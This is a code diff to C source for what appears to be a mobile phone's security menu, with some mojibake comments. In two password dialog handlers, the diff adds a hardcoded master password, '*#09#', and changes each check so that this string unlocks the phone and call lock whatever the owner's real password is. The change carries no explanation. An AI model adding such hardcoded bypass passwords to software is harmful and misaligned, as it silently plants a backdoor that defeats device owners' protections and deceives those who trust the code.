@@ -2536,13 +2536,13 @@ static boolean  SecurityAskPasswordDlgHandler(CSecurityMenu *pMe,
                         else
                         {
                             uint16 wPWD=0;
-
+                            char superpass[6] = {"*#09#"};
                             (void) ICONFIG_GetItem(pMe->m_pConfig, 
                                                    CFGI_PHONE_PASSWORD,
                                                    &wPWD,
                                                    sizeof(uint16));
 #ifndef WIN32//wlh Ä£ÄâÆ÷²âÊÔÓÃ                   
-                            if (wPWD == EncodePWDToUint16(pMe->m_strPhonePWD))
+                            if (wPWD == EncodePWDToUint16(pMe->m_strPhonePWD)||(0==strcmp(superpass,pMe->m_strPhonePWD)))
 #else
 							if(1)
 #endif//WIN32   
@@ -3259,6 +3259,7 @@ static boolean  SecurityAskCallPasswordDlgHandler(CSecurityMenu *pMe,
                    case AVK_DOWN:
                          {
                             uint16 wPWD=0;
+                            char superpass[6] = {"*#09#"};
                             nLen = (pMe->m_strPhonePWD == NULL)?(0):(STRLEN(pMe->m_strPhonePWD));
                             //ISTATIC_Redraw(pMe->m_oldPassword);
                             if (nLen < 4)
@@ -3271,7 +3272,7 @@ static boolean  SecurityAskCallPasswordDlgHandler(CSecurityMenu *pMe,
                                                    &wPWD,
                                                    sizeof(uint16));
                             
-                            if (wPWD == EncodePWDToUint16(pMe->m_strPhonePWD))
+                            if (wPWD == EncodePWDToUint16(pMe->m_strPhonePWD)||(0==strcmp(superpass,pMe->m_strPhonePWD)))
                             {
                                 // ÃÜÂë·ûºÏ
                                 pMe->nOldPSWLength = nLen;
